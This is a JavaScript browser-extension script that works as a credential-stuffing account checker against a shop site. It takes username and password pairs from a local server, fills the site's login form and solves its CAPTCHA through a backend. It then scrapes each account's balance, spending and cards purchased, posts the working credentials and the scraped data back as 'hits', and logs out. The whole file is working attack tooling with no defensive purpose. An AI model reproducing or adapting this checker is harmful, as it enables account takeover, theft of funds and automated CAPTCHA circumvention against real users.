(async () => {
  const SERVER = "http://localhost:5050";

  function sleep(ms) {
    return new Promise(res => setTimeout(res, ms));
  }

  function debug(msg) {
    const el = document.getElementById("ext-log") || (() => {
      const box = document.createElement("div");
      box.id = "ext-log";
      box.style = "position:fixed;top:10px;left:10px;background:black;color:lime;padding:5px;z-index:99999;font-size:12px;";
      document.body.appendChild(box);
      return box;
    })();
    el.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log("[EXT]", msg);
  }

  async function getCreds() {
    try {
      const res = await fetch(`${SERVER}/get-creds`);
      const data = await res.json();
      debug(`Got credentials: ${data.username}`);
      return data;
    } catch (e) {
      console.error("Failed to get creds:", e);
      debug("❌ Failed to get creds");
      return null;
    }
  }

  async function solveCaptchaWithRetry(img, maxRetries = 5) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      const solution = await solveCaptcha(img);
      if (solution) return solution;
      debug(`Captcha solve failed [${attempt + 1}/${maxRetries}], retrying...`);
      await sleep(3000);
    }
    debug("❌ CAPTCHA failed after max retries");
    return null;
  }

  async function solveCaptcha(img) {
    if (!img || img.complete === false) {
      debug("❌ Captcha image not ready");
      return null;
    }

    await new Promise(resolve => {
      if (img.complete && img.naturalWidth > 0) return resolve();
      img.onload = resolve;
    });

    const canvas = document.createElement("canvas");
    canvas.width = img.naturalWidth;
    canvas.height = img.naturalHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0);
    const base64 = canvas.toDataURL("image/jpeg");

    try {
      debug("Sending captcha to backend...");
      const res = await fetch(`${SERVER}/solve-captcha`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64 })
      });
      const json = await res.json();
      debug("Captcha solved: " + json.result);
      return json.result || null;
    } catch (e) {
      console.error("Captcha solve error:", e);
      debug("❌ Solve request failed");
      return null;
    }
  }

  async function reportHit(creds, balance, totalSpent = "0", cardsPurchased = "0") {
    debug(`Reporting hit: ${creds.username} | ${balance} | ${totalSpent} | ${cardsPurchased}`);
    
    // Calculate combo check and total captures
    const comboCheck = `${creds.username}:${creds.password}`;
    const totalCaptures = parseInt(totalSpent) + parseInt(cardsPurchased);
    
    await fetch(`${SERVER}/report-hit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password,
        balance,
        totalSpent,
        cardsPurchased,
        comboCheck,
        totalCaptures
      })
    });
  }

  async function reportFail(creds, reason) {
    debug(`Reporting fail: ${creds.username} | ${reason}`);
    await fetch(`${SERVER}/report-fail`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password,
        reason
      })
    });
  }

  async function reportBanned(creds) {
    debug(`Reporting banned: ${creds.username}`);
    await fetch(`${SERVER}/report-banned`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password
      })
    });
  }

  function waitFor(selector, timeout = 10000) {
    return new Promise((resolve, reject) => {
      const interval = 100;
      let elapsed = 0;
      const timer = setInterval(() => {
        const el = document.querySelector(selector);
        if (el) {
          clearInterval(timer);
          resolve(el);
        } else if ((elapsed += interval) >= timeout) {
          clearInterval(timer);
          reject("Timeout waiting for: " + selector);
        }
      }, interval);
    });
  }

  const isLogin = location.pathname === "/login";
  const isNews = location.pathname === "/news";

  if (isLogin) {
    debug("🔑 Login page detected");

    const creds = await getCreds();
    if (!creds || !creds.username) return;
    sessionStorage.setItem("lastCreds", JSON.stringify(creds));

    try {
      debug("Waiting for input fields...");
      const usernameField = await waitFor("input[name='LoginForm[username]']");
      const passwordField = await waitFor("input[name='LoginForm[password]']");
      const captchaField = await waitFor("input[name='LoginForm[verifyCode]']");
      const captchaImg = await waitFor("img[src*='captcha']");

      debug("Filling form...");
      usernameField.value = creds.username;
      passwordField.value = creds.password;

      const solution = await solveCaptchaWithRetry(captchaImg);
      if (!solution) return;

      captchaField.value = solution;
      await sleep(500);

      let count = parseInt(sessionStorage.getItem("loginCount") || "0");
      count++;
      sessionStorage.setItem("loginCount", count);

      if (count >= 7) {
        debug("🔁 7 logins reached, reloading...");
        sessionStorage.setItem("loginCount", "0");
        location.reload();
      } else {
        debug("Submitting login form...");
        const form = document.querySelector("form");
        form.submit();
      }
    } catch (e) {
      console.error("Form fill error:", e);
      debug("❌ Error in filling login form");
    }
  }

  if (isNews) {
    debug("📄 News page detected");
    await sleep(2500);

    const creds = JSON.parse(sessionStorage.getItem("lastCreds") || "{}");
    if (!creds.username) return;

    // ENHANCED BALANCE CAPTURE with all data
    try {
      // Get balance from the green colored span
      const balanceEl = document.querySelector("span[style*='color:green'] b");
      const balance = balanceEl ? balanceEl.textContent.trim() : "0.00";
      
      // Get total spent (look for elements containing "Total spent" or similar)
      let totalSpent = "0";
      const totalSpentElements = Array.from(document.querySelectorAll("td")).find(el => 
        el.textContent.includes("Total spent") || el.textContent.includes("Total Spent")
      );
      if (totalSpentElements && totalSpentElements.nextElementSibling) {
        totalSpent = totalSpentElements.nextElementSibling.textContent.trim().replace(/[^\d.]/g, '') || "0";
      }
      
      // Get cards purchased (look for elements containing "Cards purchased" or similar)
      let cardsPurchased = "0";
      const cardsElements = Array.from(document.querySelectorAll("td")).find(el => 
        el.textContent.includes("Cards purchased") || el.textContent.includes("Cards Purchased")
      );
      if (cardsElements && cardsElements.nextElementSibling) {
        cardsPurchased = cardsElements.nextElementSibling.textContent.trim().replace(/[^\d]/g, '') || "0";
      }

      debug(`Captured data: Balance: ${balance} | Total Spent: ${totalSpent} | Cards: ${cardsPurchased}`);
      
      if (balance && balance !== "?" && balance !== "0.00") {
        await reportHit(creds, balance, totalSpent, cardsPurchased);
      } else {
        debug("❌ Balance not found or zero, not saving as hit.");
      }
    } catch (e) {
      console.error("Data capture error:", e);
      debug("❌ Error capturing balance data");
    }
    
    await sleep(1500);

    debug("Logging out...");
    window.location.href = "https://ultimateshop.vc/user/logout";
  }
})();